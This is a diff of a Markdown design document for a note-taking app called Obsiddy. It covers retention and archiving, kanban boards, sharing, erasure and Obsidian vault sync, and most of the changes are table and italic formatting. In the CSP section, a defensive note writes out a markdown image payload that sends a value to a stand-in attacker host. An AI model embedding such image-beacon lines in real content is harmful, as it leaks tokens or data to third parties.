+A second brain that only ever accumulates becomes unusable in about eighteen months: search gets noisier, the connection sweep spends its budget on dead projects, and the ranked list fills with things you stopped caring about in 2024. This needs designing now, because the retention windows have to be _fields_ from the first migration or you'll be backfilling them later against real data.
 
 ### Three states, and only one of them destroys anything
 
-| State | What it means | Reversible? |
-| --- | --- | --- |
-| **active** | normal | — |
+| State        | What it means                                                                                         | Reversible?        |
+| ------------ | ----------------------------------------------------------------------------------------------------- | ------------------ |
+| **active**   | normal                                                                                                | —                  |
 | **archived** | hidden from every default list, search, sweep and prompt; still readable at its URL; still exportable | **yes**, one click |
-| **pruned** | row deleted | no |
+| **pruned**   | row deleted                                                                                           | no                 |
 
-**Nothing a human wrote is ever auto-pruned.** Thoughts, tasks, projects, goals and reviews auto-*archive* on a schedule and stop there, permanently, until you say otherwise. Only derived and log data is auto-pruned. This distinction is the whole design — get it wrong and the product's core promise ("put everything here, it's safe") is false.
+**Nothing a human wrote is ever auto-pruned.** Thoughts, tasks, projects, goals and reviews auto-_archive_ on a schedule and stop there, permanently, until you say otherwise. Only derived and log data is auto-pruned. This distinction is the whole design — get it wrong and the product's core promise ("put everything here, it's safe") is false.
 
-`archivedAt DateTime?` + `archivedReason String?` (`manual | aged_out | project_closed`) on the five entity tables, with every default query gaining `archivedAt: null` and `@@index([userId, archivedAt])`. Prefer a nullable timestamp over a boolean — you will want to know *when*, and it costs nothing.
+`archivedAt DateTime?` + `archivedReason String?` (`manual | aged_out | project_closed`) on the five entity tables, with every default query gaining `archivedAt: null` and `@@index([userId, archivedAt])`. Prefer a nullable timestamp over a boolean — you will want to know _when_, and it costs nothing.
 
 ### The trap: archived items and the vector index
 
 The obvious move — keep the embedding row and filter it out in the search SQL — is wrong, and it's the kind of wrong that only shows up once the data is big.
 
-HNSW is an *approximate* index: it walks a graph to find ~`ef_search` candidates and then your `WHERE` clause throws some away. If a large share of the corpus is archived, the filter discards most of what the graph returned and you get back **fewer rows than you asked for**, quietly, with no error. The result is a search that degrades as the user's history grows — precisely backwards.
+HNSW is an _approximate_ index: it walks a graph to find ~`ef_search` candidates and then your `WHERE` clause throws some away. If a large share of the corpus is archived, the filter discards most of what the graph returned and you get back **fewer rows than you asked for**, quietly, with no error. The result is a search that degrades as the user's history grows — precisely backwards.
 
-**So: archiving deletes the `ObsiddyEmbedding` rows; unarchiving re-enqueues.** The source text lives on the entity row and is never lost, `indexedHash` is nulled so the existing tick backfill re-embeds on restore, and the HNSW index stays proportional to *live* data rather than total history. Re-embedding one restored item costs a fraction of a cent. This also keeps the archived corpus out of the connection sweep and out of agent context for free, with no filter to forget.
+**So: archiving deletes the `ObsiddyEmbedding` rows; unarchiving re-enqueues.** The source text lives on the entity row and is never lost, `indexedHash` is nulled so the existing tick backfill re-embeds on restore, and the HNSW index stays proportional to _live_ data rather than total history. Re-embedding one restored item costs a fraction of a cent. This also keeps the archived corpus out of the connection sweep and out of agent context for free, with no filter to forget.
 
 Archived items remain findable by **keyword** — the `searchVector` tsvector stays, and `GET /obsiddy/search?includeArchived=true` runs BM25-only. "I know I wrote something about this two years ago" still works; it just doesn't pollute the semantic surface.
 
@@ -661,40 +661,40 @@ Archived items remain findable by **keyword** — the `searchVector` tsvector st
 
 Windows live in `ObsiddySpace.retentionPolicy Json` (Zod-validated, defaults below), user-tunable in settings. Enforced by `enforceObsiddyRetention(userId)`, modelled directly on the existing `enforceRetentionPolicies()` in `lib/orchestration/retention.ts` and run from the nightly workflow.
 
-| Data | Default | Action |
-| --- | --- | --- |
-| Thoughts still in `inbox`, untouched | 90 days | **archive** + count in the weekly review ("47 thoughts aged out — review or let go") |
-| Completed tasks | 180 days | **archive**; embeddings dropped |
-| Projects `done`/`abandoned` | 180 days after close | **archive**, and cascade-archive their tasks |
-| Goals `achieved`/`dropped` | after their horizon has passed + 1 period | **archive** |
-| Reviews | 2 years | **archive** |
-| Entities with no linked activity | 365 days | **flag in the stale digest** — never auto-archive; a dormant client is not a dead one |
-| Documents | never | **kept** — deliberately uploaded reference material; archive manually only |
-| Boards, tags | never | **kept** — configuration, not content. Archive manually |
-| `ObsiddyBoardCard` rows whose task was archived | with the task | **prune** — an explicit board shouldn't hold ghosts |
-| `ObsiddyChecklistItem` | with the task | **cascade** (real FK, `onDelete: Cascade`) |
-| `ObsiddyLink` with `status: 'rejected'` | never | **kept forever** — see below |
-| `ObsiddyLink` `suggested`, never actioned | 60 days | **prune** (derived data, regenerable) |
-| `ObsiddyEvent` | 400 days | **prune** — highest-volume table by far, and a rolling year covers every review period |
-| `ObsiddyVaultSyncRun` plans | 30 days | **prune** |
-| Vault snapshots in blob storage | 30 days | **prune** (already specified in §14) |
-| `ObsiddyTimeBlock` with `source: 'plan'`, past and unactioned | 90 days | **prune** |
+| Data                                                          | Default                                   | Action                                                                                 |
+| ------------------------------------------------------------- | ----------------------------------------- | -------------------------------------------------------------------------------------- |
+| Thoughts still in `inbox`, untouched                          | 90 days                                   | **archive** + count in the weekly review ("47 thoughts aged out — review or let go")   |
+| Completed tasks                                               | 180 days                                  | **archive**; embeddings dropped                                                        |
+| Projects `done`/`abandoned`                                   | 180 days after close                      | **archive**, and cascade-archive their tasks                                           |
+| Goals `achieved`/`dropped`                                    | after their horizon has passed + 1 period | **archive**                                                                            |
+| Reviews                                                       | 2 years                                   | **archive**                                                                            |
+| Entities with no linked activity                              | 365 days                                  | **flag in the stale digest** — never auto-archive; a dormant client is not a dead one  |
+| Documents                                                     | never                                     | **kept** — deliberately uploaded reference material; archive manually only             |
+| Boards, tags                                                  | never                                     | **kept** — configuration, not content. Archive manually                                |
+| `ObsiddyBoardCard` rows whose task was archived               | with the task                             | **prune** — an explicit board shouldn't hold ghosts                                    |
+| `ObsiddyChecklistItem`                                        | with the task                             | **cascade** (real FK, `onDelete: Cascade`)                                             |
+| `ObsiddyLink` with `status: 'rejected'`                       | never                                     | **kept forever** — see below                                                           |
+| `ObsiddyLink` `suggested`, never actioned                     | 60 days                                   | **prune** (derived data, regenerable)                                                  |
+| `ObsiddyEvent`                                                | 400 days                                  | **prune** — highest-volume table by far, and a rolling year covers every review period |
+| `ObsiddyVaultSyncRun` plans                                   | 30 days                                   | **prune**                                                                              |
+| Vault snapshots in blob storage                               | 30 days                                   | **prune** (already specified in §14)                                                   |
+| `ObsiddyTimeBlock` with `source: 'plan'`, past and unactioned | 90 days                                   | **prune**                                                                              |
 
-**Rejected connections are kept forever, and this matters more than it looks.** The sweep excludes any pair that already has a `ObsiddyLink` row, so a `rejected` row *is* the tombstone that stops the same suggestion returning every Sunday for the rest of your life. The `@@unique([userId, sourceType, sourceId, targetType, targetId, kind])` constraint from §1 is what makes this work. Pruning rejected links would silently reintroduce an infinite nag loop — put a comment on the retention table saying so, because it looks like dead data and someone *will* try to clean it up.
+**Rejected connections are kept forever, and this matters more than it looks.** The sweep excludes any pair that already has a `ObsiddyLink` row, so a `rejected` row _is_ the tombstone that stops the same suggestion returning every Sunday for the rest of your life. The `@@unique([userId, sourceType, sourceId, targetType, targetId, kind])` constraint from §1 is what makes this work. Pruning rejected links would silently reintroduce an infinite nag loop — put a comment on the retention table saying so, because it looks like dead data and someone _will_ try to clean it up.
 
 ### Obsolescence is a question, not a rule
 
 Age is a poor proxy for irrelevance. A life goal untouched for a year isn't dead; a project untouched for six weeks probably is. So the system **proposes and you decide** — no silent status changes on anything with a status.
 
-The monthly `obsiddy-horizon-check` workflow already scores goals on evidenced activity; extend it to emit a **stale-items digest**: projects with no activity and no completed tasks in 90 days, goals whose target date passed with no linked progress, areas with zero logged time in 60 days, and **entities with no linked activity in 90 days** ("you haven't touched Acme since April — still a client?"). Each row gets one-click *still live* / *archive* / *drop*. Choosing "still live" writes `lastActivityAt = now()`, which is honest — you *did* just engage with it — and stops it reappearing next month.
+The monthly `obsiddy-horizon-check` workflow already scores goals on evidenced activity; extend it to emit a **stale-items digest**: projects with no activity and no completed tasks in 90 days, goals whose target date passed with no linked progress, areas with zero logged time in 60 days, and **entities with no linked activity in 90 days** ("you haven't touched Acme since April — still a client?"). Each row gets one-click _still live_ / _archive_ / _drop_. Choosing "still live" writes `lastActivityAt = now()`, which is honest — you _did_ just engage with it — and stops it reappearing next month.
 
 The stale digest is the one place the agent should be a bit blunt. Copy per CLAUDE.md's rule: plain English and concrete actions, no softening.
 
 ### Restore, and the two interactions that bite
 
 - **Restore** — `POST /api/v1/obsiddy/{type}/[id]/restore` clears `archivedAt`, nulls `indexedHash` (re-embed), and writes a `ObsiddyEvent`. An archived list view per type, plus `GET /obsiddy/search?includeArchived=true`, are the only two ways to reach archived items — deliberately not in the main nav.
-- **Vault sync** — an archived item's file **moves to `Archive/<type>/` in the vault, it is not deleted.** Deleting files is the one operation §14 spends three mitigations avoiding; archival must not become a back door to it. Restoring moves it back. A file *manually* dragged into `Archive/` in Obsidian archives the row — a genuinely nice gesture that costs one path check.
-- **Sharing** — archiving an item does **not** revoke its share links or grants, and archived items stay readable at their public URL. Archiving is a decluttering action on *your* view; silently 404-ing a link you gave to 200 people because you tidied your project list would be indefensible. The archive UI warns when the item has active shares and offers to revoke them in the same action.
+- **Vault sync** — an archived item's file **moves to `Archive/<type>/` in the vault, it is not deleted.** Deleting files is the one operation §14 spends three mitigations avoiding; archival must not become a back door to it. Restoring moves it back. A file _manually_ dragged into `Archive/` in Obsidian archives the row — a genuinely nice gesture that costs one path check.
+- **Sharing** — archiving an item does **not** revoke its share links or grants, and archived items stay readable at their public URL. Archiving is a decluttering action on _your_ view; silently 404-ing a link you gave to 200 people because you tidied your project list would be indefensible. The archive UI warns when the item has active shares and offers to revoke them in the same action.
 
 Erasure is unaffected: archived rows carry `userId` like any other and cascade identically.
 
@@ -713,9 +713,9 @@ A kanban board is a **view over data that already exists**, not a new subsystem.
 Kanban tools let you hand-sort a column because they have no opinion about what matters. **This app has a scorer**, so hand-sorting means maintaining an order `score.ts` already computes — and the two will silently disagree.
 
 - **Within a column, order by `priorityScore DESC`.** No arbitrary mid-column reordering on a filter-backed board.
-- **Dragging a card to the top of a column sets `manualBoost`** (§10) rather than a separate position field. That reuses the existing override *including its 7-day expiry*, so "this one first" behaves identically whether done on the board or in a list — and decays rather than silently rotting.
+- **Dragging a card to the top of a column sets `manualBoost`** (§10) rather than a separate position field. That reuses the existing override _including its 7-day expiry_, so "this one first" behaves identically whether done on the board or in a list — and decays rather than silently rotting.
 - **Dragging between columns changes `status`.** That is the gesture that carries real information.
-- **`ObsiddyBoardCard.position` exists but is only honoured when `membership: 'explicit'`** — a hand-curated board (a sprint, a shortlist, a client's work-in-flight) is a legitimate case for manual order, because there the ordering *is* the content. Fractional indexing: insert at `(prev + next) / 2`, renormalise the column when the gap drops below `1e-6`.
+- **`ObsiddyBoardCard.position` exists but is only honoured when `membership: 'explicit'`** — a hand-curated board (a sprint, a shortlist, a client's work-in-flight) is a legitimate case for manual order, because there the ordering _is_ the content. Fractional indexing: insert at `(prev + next) / 2`, renormalise the column when the gap drops below `1e-6`.
 
 Two ordering mechanisms exist, but they never apply to the same board. That separation is the point — don't let explicit positions leak into filter-backed boards.
 
@@ -729,15 +729,15 @@ Two ordering mechanisms exist, but they never apply to the same board. That sepa
 
 Trello-equivalent, reusing what's already there:
 
-| Trello concept | Here |
-| --- | --- |
-| Description / bullets | `ObsiddyTask.notes` (existing `Text`), rendered with `react-markdown` + `remark-gfm` — **both already dependencies**. No raw HTML, matching `components/admin/orchestration/markdown-or-raw-view.tsx` |
-| Labels | `ObsiddyTag` + `ObsiddyTaskTag` |
-| Checklists | `ObsiddyChecklistItem`, with a `3/7` progress pill on the card face |
-| Due date | `ObsiddyTask.dueAt` (existing) |
-| Attachments | link a `ObsiddyDocument` via `ObsiddyLink` — no new table |
-| Card links / relations | `ObsiddyLink` (existing), rendered as chips |
-| External links | URLs in `notes`, sanitised through `sanitizeUrl()` from `lib/security/sanitize.ts` |
+| Trello concept         | Here                                                                                                                                                                                                  |
+| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Description / bullets  | `ObsiddyTask.notes` (existing `Text`), rendered with `react-markdown` + `remark-gfm` — **both already dependencies**. No raw HTML, matching `components/admin/orchestration/markdown-or-raw-view.tsx` |
+| Labels                 | `ObsiddyTag` + `ObsiddyTaskTag`                                                                                                                                                                       |
+| Checklists             | `ObsiddyChecklistItem`, with a `3/7` progress pill on the card face                                                                                                                                   |
+| Due date               | `ObsiddyTask.dueAt` (existing)                                                                                                                                                                        |
+| Attachments            | link a `ObsiddyDocument` via `ObsiddyLink` — no new table                                                                                                                                             |
+| Card links / relations | `ObsiddyLink` (existing), rendered as chips                                                                                                                                                           |
+| External links         | URLs in `notes`, sanitised through `sanitizeUrl()` from `lib/security/sanitize.ts`                                                                                                                    |
 
 **Tags are a table, not a `String[]` column.** A string array is simpler and tempting, but renaming a label across 500 tasks means rewriting 500 rows, and Trello-style labels need a colour. A join table also makes tags a first-class board filter and swimlane dimension. This mirrors the platform's own `KnowledgeTag` decision, and its docs record the same reasoning.
 
@@ -747,11 +747,11 @@ Trello-equivalent, reusing what's already there:
 
 **Trello has no "import JSON" button.** Its own board-export JSON cannot be re-imported through the UI. So there are three honest paths:
 
-| Path | Needs | Ship in |
-| --- | --- | --- |
-| **CSV export** — one row per card, Trello-compatible column headers (`Name`, `Description`, `Labels`, `Due Date`, `List`) | nothing | Release 1 |
-| **JSON export** in Trello's board shape (`lists[]`, `cards[]`, `labels[]`) | nothing | Release 1 |
-| **Live push via the Trello REST API** — creates board → lists → cards → checklists → labels | a per-user API key + token, i.e. `lib/security/secret-box.ts` | Release 4 |
+| Path                                                                                                                      | Needs                                                         | Ship in   |
+| ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- | --------- |
+| **CSV export** — one row per card, Trello-compatible column headers (`Name`, `Description`, `Labels`, `Due Date`, `List`) | nothing                                                       | Release 1 |
+| **JSON export** in Trello's board shape (`lists[]`, `cards[]`, `labels[]`)                                                | nothing                                                       | Release 1 |
+| **Live push via the Trello REST API** — creates board → lists → cards → checklists → labels                               | a per-user API key + token, i.e. `lib/security/secret-box.ts` | Release 4 |
 
 **Ship CSV and JSON first.** They cost a day, need no credentials, and CSV imports into Trello Premium, Jira, Asana, Notion and Linear alike — so "export to external boards" is satisfied generically rather than for one vendor. The live API push is genuinely useful but it drags in per-user credential storage, which is the single most expensive piece of infrastructure in this plan (§17, risk 6). Do not let a nice-to-have export pull `secret-box` forward into Release 1.
 
@@ -759,7 +759,7 @@ Export is **owner-scoped and read-only**: `GET /obsiddy/boards/[id]/export?forma
 
 ### Chat-created tasks
 
-Tasks the agent creates via `obsiddy_upsert_task` mid-conversation land on the board immediately — same table, no sync step. The gap is *noticing* them, so add a **"4 added from chat today"** filter chip. `ObsiddyTask` needs no new column: `ObsiddyEvent` already logs creation and its `payload Json` can carry the origin.
+Tasks the agent creates via `obsiddy_upsert_task` mid-conversation land on the board immediately — same table, no sync step. The gap is _noticing_ them, so add a **"4 added from chat today"** filter chip. `ObsiddyTask` needs no new column: `ObsiddyEvent` already logs creation and its `payload Json` can carry the origin.
 
 ---
 
@@ -787,7 +787,7 @@ Three mitigations, all required:
 
 An explicit-membership board has no such problem — its contents are exactly the rows you put in it.
 
-**Board cascade** is one level, computed at read time like every other cascade: board → its cards' tasks (title, status, due, tags, checklist progress — **never `notes`** unless `includeTaskDetail` is on). A shared board never exposes the tasks' parent projects, their links to non-shared items, or their `priorityScore`. A shared *task* likewise exposes its own tags and checklist but not its project, its `manualBoostReason`, or its score.
+**Board cascade** is one level, computed at read time like every other cascade: board → its cards' tasks (title, status, due, tags, checklist progress — **never `notes`** unless `includeTaskDetail` is on). A shared board never exposes the tasks' parent projects, their links to non-shared items, or their `priorityScore`. A shared _task_ likewise exposes its own tags and checklist but not its project, its `manualBoostReason`, or its score.
 
 - `ObsiddyGrant` — `userId` is the **owner** (preserves the invariant), `granteeUserId` (null until accepted, FK `ON DELETE CASCADE`), `granteeEmail`, `role` (`viewer|commenter`), `inviteTokenHash`, `expiresAt`, `revokedAt`. `@@unique([entityType, entityId, granteeEmail])`.
 - `ObsiddyShareLink` — `tokenHash @unique` (sha256), `tokenPrefix` for UI, `includeChildren`, `expiresAt`, `revokedAt`, `viewCount`.
@@ -819,7 +819,7 @@ Enforce D5 with a `no-restricted-imports` block in `lib/app/eslint.config.mjs` f
 
 ### Shared-in items get their own surface — they do NOT appear in my lists or search
 
-Three reasons in weight order: it preserves `WHERE userId = $1` as an unconditional invariant on every list, search and embedding query; a second brain's lists are a *planning* surface, and someone else's project in "my projects" corrupts prioritisation and your own sense of what you've committed to; mixed-in items make ~40 list endpoints potential leaks, versus ~6 to get right.
+Three reasons in weight order: it preserves `WHERE userId = $1` as an unconditional invariant on every list, search and embedding query; a second brain's lists are a _planning_ surface, and someone else's project in "my projects" corrupts prioritisation and your own sense of what you've committed to; mixed-in items make ~40 list endpoints potential leaks, versus ~6 to get right.
 
 Ship `/shared-with-me` with its own routes under `/api/v1/obsiddy/shared/*`, its own search that explicitly does **not** touch `ObsiddyEmbedding`, and no write paths.
 
@@ -827,11 +827,11 @@ Ship `/shared-with-me` with its own routes under `/api/v1/obsiddy/shared/*`, its
 
 `app/(public)/s/[token]/page.tsx` + `app/api/v1/obsiddy/public/[token]/route.ts`. `/s/` sits outside every protected prefix — **add `/obsiddy` to `lib/app/protected-routes.ts`; never add `/s`.**
 
-Public viewer sees: title, body (react-markdown, no raw HTML — reuse the config in `components/admin/orchestration/markdown-or-raw-view.tsx`), status, and the cascaded child list if `includeChildren`. **Never**: owner email, other items, links to non-shared items, event history, comments, rationales, priority scores. A named grantee additionally sees owner identity, comments, and the item in `/shared-with-me` — a public link is a *document*, a named grant is a *relationship*.
+Public viewer sees: title, body (react-markdown, no raw HTML — reuse the config in `components/admin/orchestration/markdown-or-raw-view.tsx`), status, and the cascaded child list if `includeChildren`. **Never**: owner email, other items, links to non-shared items, event history, comments, rationales, priority scores. A named grantee additionally sees owner identity, comments, and the item in `/shared-with-me` — a public link is a _document_, a named grant is a _relationship_.
 
 Revocation sets `revokedAt`; **lift `isShareActive` from `conversation-access.ts` to a shared util so the two systems can't drift.** In the same transaction, flip `visibility` back to `private` when the last link is revoked. Expiry defaults to 30 days, max 365; `null` requires an explicit "never expires" checkbox.
 
-**Robots — three things, all required:** add `'/s/'` to `app/robots.ts` (**core file edit**; verified absent today); per-page `robots: { index: false, follow: false, noarchive: true, nosnippet: true }` because robots.txt is advisory and doesn't remove already-indexed URLs; `X-Robots-Tag` on the API route too. Also set **`Referrer-Policy: no-referrer` on this route specifically** — the token is in the *path*, and any outbound link in a note leaks the full URL under the global `strict-origin-when-cross-origin`.
+**Robots — three things, all required:** add `'/s/'` to `app/robots.ts` (**core file edit**; verified absent today); per-page `robots: { index: false, follow: false, noarchive: true, nosnippet: true }` because robots.txt is advisory and doesn't remove already-indexed URLs; `X-Robots-Tag` on the API route too. Also set **`Referrer-Policy: no-referrer` on this route specifically** — the token is in the _path_, and any outbound link in a note leaks the full URL under the global `strict-origin-when-cross-origin`.
 
 **CSP:** no relaxation needed. Note the trap: `next.config.js` sets `X-Frame-Options: DENY` for `/(.*)` unconditionally, so a framable "embed my roadmap" page is impossible without a core edit. Not a v1 problem, but design around it. `img-src` allows `https:`, so `![](https://attacker/x?t=…)` fires on view — mostly self-inflicted, **except** when the note came from an untrusted repo via vault sync. Render remote images as click-to-load placeholders on the public reader; don't tighten `img-src` globally.
 
@@ -854,7 +854,7 @@ Lower-case the email; if a `User` exists, still send the email but set `granteeU
 One `registerErasureCleanupHook({ name: 'obsiddy' })` from `lib/app/bootstrap.ts`.
 
 - **Owner erased** — everything cascades via `ObsiddySpace`. Make the reader's "not found" and "revoked" paths **the same code path** so links 404 rather than 500. `cleanupExternal` deletes `obsiddy-vaults/<userId>/` and `obsiddy-vault-snapshots/<userId>/` blobs.
-- **Grantee erased — the case the default cascade gets wrong.** `ObsiddyGrant.userId` is the *owner*, so nothing cascades when the grantee goes, and `SetNull` would leave a dangling grant addressed by `granteeEmail` — retained PII belonging to the erased person, on a row they can't control. Art. 17 violation. Fix: explicit `ON DELETE CASCADE` on `granteeUserId`, **plus** a `scrubInTransaction` hook deleting grants matched by `granteeEmail` to catch *unaccepted* invites where `granteeUserId` is still null. `ErasureTxContext` carries only `userId`, so read the email via `tx.user.findUnique` inside the hook — this works because hooks run before `user.delete()`.
+- **Grantee erased — the case the default cascade gets wrong.** `ObsiddyGrant.userId` is the _owner_, so nothing cascades when the grantee goes, and `SetNull` would leave a dangling grant addressed by `granteeEmail` — retained PII belonging to the erased person, on a row they can't control. Art. 17 violation. Fix: explicit `ON DELETE CASCADE` on `granteeUserId`, **plus** a `scrubInTransaction` hook deleting grants matched by `granteeEmail` to catch _unaccepted_ invites where `granteeUserId` is still null. `ErasureTxContext` carries only `userId`, so read the email via `tx.user.findUnique` inside the hook — this works because hooks run before `user.delete()`.
 - `ObsiddyComment.authorUserId` → **CASCADE**, not SetNull-and-keep: the body is free text the erased person wrote.
 
 ---
@@ -874,7 +874,7 @@ YAML frontmatter carries `obsiddy-id`, `obsiddy-type`, `title`, `status`, struct
 
 **Deliberately absent: `updated:`.** A mutating timestamp in frontmatter means every DB touch rewrites every file and re-triggers hashing and re-embedding. Obsidian users get mtime from the filesystem. This one omission is worth more than it looks.
 
-**Checkbox syntax — supported, asymmetrically.** One file per task is canonical, but every Project file also gets a generated block between `<!-- brain:tasks:start/end -->` sentinels with `- [ ] Title ^bt-<id>` lines (Obsidian-native block IDs survive edits). Sync reads back **exactly two things**: checkbox state and the text before the block ID. Ticking a box in the project note is *the* Obsidian gesture — without it you've built an export, not a co-equal surface.
+**Checkbox syntax — supported, asymmetrically.** One file per task is canonical, but every Project file also gets a generated block between `<!-- brain:tasks:start/end -->` sentinels with `- [ ] Title ^bt-<id>` lines (Obsidian-native block IDs survive edits). Sync reads back **exactly two things**: checkbox state and the text before the block ID. Ticking a box in the project note is _the_ Obsidian gesture — without it you've built an export, not a co-equal surface.
 
 **Dataview `key:: value` — no on write, tolerant on read.** It's a plugin dialect with no spec and a competing successor, and inline fields interleave with prose, so round-tripping would force rewriting user prose. But if the body has `due:: 2026-08-01` and frontmatter doesn't, lift it into frontmatter on the next write and leave the inline field alone.
 
@@ -884,20 +884,20 @@ YAML frontmatter carries `obsiddy-id`, `obsiddy-type`, `title`, `status`, struct
 
 `obsiddy-id` in frontmatter is primary (survives rename, move, copy); `.brain/manifest.json` is secondary and answers "what path did this live at last time?" (rename vs delete). When they disagree, **DB wins for identity** and the manifest is rebuilt.
 
-| Case | Resolution |
-| --- | --- |
-| Renamed in Obsidian | Update path. If the filename-derived title changed and frontmatter `title` didn't, treat as a **retitle** — that's the Obsidian gesture |
-| File deleted in vault | **Do not delete the row.** `state='orphaned_remote'`, report it. `deletePropagation:'mirror'` is opt-in and soft-delete only — deletion is the one unrecoverable op and Obsidian file deletion is far too easy |
-| Row deleted in app | Delete the file **and** write `.brain/trash/<id>.md` |
-| New file in vault | Mint a cuid, write `obsiddy-id` back on the same pass. Files outside known folders are **ignored entirely** |
-| Duplicate IDs | Manifest-path match keeps it; others get fresh IDs and become new rows titled `… (copy)`. Never merge, never "latest mtime wins" |
-| ID with no row for this user | Treat as new; keep the old in `obsiddy-source-id:`. **Never trust a client-supplied ID to address a row** — this is a security property |
+| Case                         | Resolution                                                                                                                                                                                                     |
+| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Renamed in Obsidian          | Update path. If the filename-derived title changed and frontmatter `title` didn't, treat as a **retitle** — that's the Obsidian gesture                                                                        |
+| File deleted in vault        | **Do not delete the row.** `state='orphaned_remote'`, report it. `deletePropagation:'mirror'` is opt-in and soft-delete only — deletion is the one unrecoverable op and Obsidian file deletion is far too easy |
+| Row deleted in app           | Delete the file **and** write `.brain/trash/<id>.md`                                                                                                                                                           |
+| New file in vault            | Mint a cuid, write `obsiddy-id` back on the same pass. Files outside known folders are **ignored entirely**                                                                                                    |
+| Duplicate IDs                | Manifest-path match keeps it; others get fresh IDs and become new rows titled `… (copy)`. Never merge, never "latest mtime wins"                                                                               |
+| ID with no row for this user | Treat as new; keep the old in `obsiddy-source-id:`. **Never trust a client-supplied ID to address a row** — this is a security property                                                                        |
 
 ### Change detection and conflict resolution
 
 Compare **normalised** forms, not raw bytes: parse to `{frontmatter: sortedRecord, body}` and hash `JSON.stringify(frontmatter) + '\n' + body.trimEnd()`. Without this, YAML key reordering, quote style, CRLF and trailing newlines produce ~80% of your "conflicts" and destroy trust in week one. Two hashes, because the round-trip is lossy in exactly one direction: frontmatter is regenerated, body is verbatim.
 
-**Check "both changed, same result" *before* declaring a conflict** — it happens constantly (both sides ticked done).
+**Check "both changed, same result" _before_ declaring a conflict** — it happens constantly (both sides ticked done).
 
 **Structured three-way field merge, never a text merge.** Frontmatter field diverged on both sides ⇒ **DB wins**, loser recorded in the report. Body diverged on both sides ⇒ **vault wins**, DB version written to `.brain/conflicts/<slug>-<ts>.md`. The asymmetry is the point: structured fields are mutated continuously by workflows and the ranker, and a stale file winning would silently roll back an agent decision; prose is the opposite — the vault is a text editor and the app is not, so three paragraphs must never be lost to a DB update that only touched `status`. Both failure modes stay recoverable. **Timestamp-based last-writer-wins is rejected outright** — mtimes across zip, Drive and git are unreliable and rewritten by the transports themselves.
 
@@ -907,10 +907,14 @@ State lives in a **satellite table, not entity columns**: `ObsiddyVault`, `Obsid
 
 ```ts
 interface VaultTransportSession extends AsyncDisposable {
-  capabilities: TransportCapabilities;   // canPull, canPush, atomicCommit, versioned,
-                                         // supportsWebhook, hasHistory, maxFiles, maxTotalBytes
-  list(); read(path); write(path, content); delete(path);
-  commit(message): Promise<{revision: string|null}>; abort();
+  capabilities: TransportCapabilities; // canPull, canPush, atomicCommit, versioned,
+  // supportsWebhook, hasHistory, maxFiles, maxTotalBytes
+  list();
+  read(path);
+  write(path, content);
+  delete(path);
+  commit(message): Promise<{ revision: string | null }>;
+  abort();
 }
 ```
 
@@ -918,7 +922,7 @@ Sessions are **staged** — writes accumulate, `commit()` flushes. Git gets one 
 
 - **Zip** — `fflate` (declare it; don't free-ride on mammoth's transitive jszip). Returns a flat `{path: Uint8Array}` map with zero filesystem contact, so classic zip-slip is structurally impossible; adm-zip has a long path-traversal CVE history. Snapshot-in/snapshot-out, which works only because the merge base lives in `ObsiddyVaultFile`, not in the transport.
 - **Git** — `isomorphic-git`. The only transport with genuine two-way semantics. Chosen over `simple-git` because it needs no `git` binary (matters for standalone Docker) and doesn't shell out — `simple-git` puts you one argument-injection bug away from RCE on a user-supplied remote. HTTPS-only, no SSH; treat that as a feature. Shallow `depth: 1` single-branch clone into a tmpdir. **On non-fast-forward, never force** — abort, re-clone next run.
-- **Dropbox before Google Drive.** ~200 lines of REST each (avoids the ~100 MB `googleapis`). Dropbox's `list_folder` cursor gives a delta out of the box and `content_hash` is a documented stable per-file hash. Drive's `drive` scope is *restricted* and triggers a CASA security assessment costing real money and weeks; `drive.file` avoids it but only sees files your app created. **This is the most under-estimated line item in the whole design.**
+- **Dropbox before Google Drive.** ~200 lines of REST each (avoids the ~100 MB `googleapis`). Dropbox's `list_folder` cursor gives a delta out of the box and `content_hash` is a documented stable per-file hash. Drive's `drive` scope is _restricted_ and triggers a CASA security assessment costing real money and weeks; `drive.file` avoids it but only sees files your app created. **This is the most under-estimated line item in the whole design.**
 - **"Start a new vault" is not a transport** — it's `generateStarterVault(spaceId)` (folder skeleton, minimal `.obsidian/`, a README explaining the frontmatter contract, manifest) running against any transport. `ManagedTransport` is then just "zip with server-side persistence under `obsiddy-vaults/<userId>/<vaultId>/`". **This collapses four transports into three implementations plus one generator — the single biggest scope saving available.**
 
 **New deps, three total: `yaml`, `fflate`, `isomorphic-git`.** Skip `gray-matter` — a 40-line parse/serialise over `yaml@2` gives control of delimiter/BOM/CRLF handling, and `yaml@2` preserves comments and formatting, which matters enormously when rewriting frontmatter in someone's file.
@@ -933,13 +937,13 @@ Sessions are **staged** — writes accumulate, `commit()` flushes. Git gets one 
 
 **Not `AiWorkflowSchedule`** (verified: cron-per-workflow, `createdBy` only, no per-user scoping). Use the maintenance tick, mirroring `backfillMissingEmbeddings`:
 
-Claim with `SELECT … WHERE isEnabled AND nextSyncAt <= now() ORDER BY nextSyncAt LIMIT 5 FOR UPDATE SKIP LOCKED`, then **immediately** set `nextSyncAt = now() + interval` so a crash can't hot-loop. Hard caps: 5 vaults per tick, 60s wall clock per run — the chain watchdog is 5 minutes for *all eight* tasks and one slow git clone must not eat it. Backoff `interval * min(2^failureCount, 32)` with jitter; disable and email once at `failureCount >= 8`.
+Claim with `SELECT … WHERE isEnabled AND nextSyncAt <= now() ORDER BY nextSyncAt LIMIT 5 FOR UPDATE SKIP LOCKED`, then **immediately** set `nextSyncAt = now() + interval` so a crash can't hot-loop. Hard caps: 5 vaults per tick, 60s wall clock per run — the chain watchdog is 5 minutes for _all eight_ tasks and one slow git clone must not eat it. Backoff `interval * min(2^failureCount, 32)` with jitter; disable and email once at `failureCount >= 8`.
 
 > **Preferred:** add a `lib/app/maintenance-tasks.ts` seam (`registerAppMaintenanceTask({name, run})`, ~30 lines, upstreamable) rather than editing `run-tick.ts` directly. Otherwise this is a core file edit.
 
 Manual `POST /obsiddy/vaults/:id/sync` runs inline with a 25s budget, falls back to queued. Git webhook (HMAC over raw body, verified the way `inbound/adapters/slack.ts` does it) is a nice-to-have; 15-minute polling is fine for v1.
 
